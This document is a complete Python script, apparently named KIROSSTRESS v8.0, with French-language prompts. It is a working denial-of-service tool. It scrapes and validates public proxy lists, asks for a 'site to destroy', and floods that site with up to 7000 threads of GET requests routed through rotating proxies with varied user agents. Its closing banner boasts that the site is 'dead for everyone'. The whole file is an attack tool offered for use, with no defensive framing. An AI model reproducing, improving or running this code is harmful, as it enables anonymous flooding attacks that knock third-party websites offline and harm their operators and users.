import requests
import time
import random
import sys
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

ASCII_ART = """
\033[91m
   ██╗  ██╗██╗██████╗  ██████╗ ███████╗███████╗████████╗██████╗ ███████╗███████╗███████╗
   ██║ ██╔╝██║██╔══██╗██╔═══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝
   █████╔╝ ██║██████╔╝██║   ██║███████╗███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗
   ██╔═██╗ ██║██╔══██╗██║   ██║╚════██║╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║
   ██║  ██╗██║██║  ██║╚██████╔╝███████║███████║   ██║   ██║  ██║███████╗███████║███████║
   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
\033[0m
          \033[1;36m[ v8.0 | .gg/kirosb + AUTO-PROXIES → AUTO-DDOS ]\033[0m
"""

INTENSITY = {
    1: {"threads": 300,  "name": "Léger"},
    2: {"threads": 800,  "name": "Moyen"},
    3: {"threads": 2000, "name": "Fort"},
    4: {"threads": 4000, "name": "Extrême"},
    5: {"threads": 7000, "name": "APOCALYPSE"}
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "curl/7.68.0", "Wget/1.21",
    "Mozilla/5.0 (X11; Linux x86_64)", "Googlebot/2.1"
]

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/mertguvencli/proxy-list/main/proxy-list/data.txt"
]

def clear(): print("\033[H\033[J", end="")

def print_log(msg, color="\033[92m"):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {color}{msg}\033[0m")

def test_proxy(proxy):
    try:
        proxies = {'http': proxy, 'https': proxy}
        r = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
        return r.status_code == 200, r.json().get('origin', '???')
    except:
        return False, None

def download_fresh_proxies():
    print_log("TÉLÉCHARGEMENT DE PROXIES FRAIS...", "\033[96m")
    fresh = set()
    for url in PROXY_SOURCES:
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                lines = [l.strip() for l in r.text.splitlines() if ':' in l and l.strip()]
                fresh.update(lines)
                print_log(f"{len(lines)} depuis {url.split('/')[2]}", "\033[93m")
        except:
            pass
    return list(fresh)

def auto_clean_and_refill():
    print_log("NETTOYAGE + REMPLISSAGE DE proxies.txt...", "\033[1;36m")
    
    old = []
    if os.path.exists('proxies.txt'):
        with open('proxies.txt', 'r') as f:
            old = [line.strip() for line in f if line.strip() and ':' in line]

    new = download_fresh_proxies()
    all_proxies = list(set(old + new))
    print_log(f"{len(all_proxies)} proxies à tester...", "\033[96m")

    working = []
    with ThreadPoolExecutor(max_workers=150) as exec:
        future_to_proxy = {exec.submit(test_proxy, f"http://{p}"): p for p in all_proxies}
        for future in as_completed(future_to_proxy):
            p = future_to_proxy[future]
            try:
                ok, ip = future.result()
                if ok:
                    working.append(p)
                    print_log(f"VIVANT → {ip}", "\033[92m")
                else:
                    print_log(f"MORT → {p}", "\033[91m")
            except:
                pass

    with open('proxies.txt', 'w') as f:
        for p in working:
            f.write(p + '\n')

    print_log(f"{len(working)} PROXIES VIVANTS → proxies.txt MIS À JOUR !", "\033[1;92m")
    return [f"http://{p}" for p in working]

def attack_worker(url, proxy, duration, stats):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    start = time.time()
    while time.time() - start < duration:
        try:
            proxies = {'http': proxy, 'https': proxy}
            r = requests.get(url, headers=headers, proxies=proxies, timeout=3)
            stats['success'] += 1
            print_log(f"OK {r.status_code} | {proxy.split('@')[-1]}", "\033[92m")
        except:
            stats['failed'] += 1

def main():
    clear()
    print(ASCII_ART)

    print("\033[93m[1] URL du site à détruire\033[0m")
    target = input("    ➤ URL: ").strip()
    if not target.startswith("http"):
        target = "https://" + target
    print(f"    CIBLE → {target}\n")

    print("\033[93m[2] Durée du test (secondes)\033[0m")
    duration = int(input("    ➤ Temps: ").strip())
    print(f"    DURÉE → {duration}s\n")

    print("\033[93m[3] Niveau d'intensité (1-5)\033[0m")
    for k, v in INTENSITY.items():
        print(f"    {k} → {v['name']} ({v['threads']} threads)")
    while True:
        level = input("    ➤ Choix (1-5): ").strip()
        if level in "12345":
            level = int(level)
            threads = INTENSITY[level]["threads"]
            name = INTENSITY[level]["name"]
            break
        print("    \033[91mErreur: 1 à 5\033[0m")
    print(f"    INTENSITÉ → {name} ({threads} threads)\n")

    print_log("LANCEMENT AUTO-NETTOYAGE PROXIES...", "\033[1;36m")
    proxies = auto_clean_and_refill()

    if len(proxies) < 20:
        print_log("TROP PEU DE PROXIES → DOWN LOCAL", "\033[91m")
        sys.exit(1)

    print_log(f"{len(proxies)} PROXIES VIVANTS → PRÊT POUR LE DDOS !", "\033[1;92m")

    print("\n\033[1;31m" + "═"*80)
    print(f"        DDOS LANCÉ – NIVEAU {level} : {name.upper()}")
    print("═"*80 + "\033[0m\n")
    time.sleep(3)

    stats = {'success': 0, 'failed': 0}
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for _ in range(threads):
            proxy = random.choice(proxies)
            futures.append(executor.submit(attack_worker, target, proxy, duration, stats))
        for f in futures:
            f.result()

    total_time = time.time() - start_time
    rps = stats['success'] / total_time if total_time > 0 else 0

    clear()
    print(ASCII_ART)
    print("\033[1;33m" + "═" * 80)
    print("                       DDOS TERMINÉ")
    print("═" * 80)
    print(f"   CIBLE       → {target}")
    print(f"   DURÉE       → {duration}s")
    print(f"   NIVEAU      → {level} - {name}")
    print(f"   RPS MOYEN   → {rps:,.2f} req/s")
    print(f"   SUCCÈS      → {stats['success']:,}")
    print(f"   PROXIES     → {len(proxies)} vivants")
    print("═" * 80)
    if rps > 1500:
        print("\033[91mSITE MORT POUR TOUT LE MONDE\033[0m")
    else:
        print("\033[93mAugmente le niveau ou le temps !\033[0m")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[91mSTOP.\033[0m")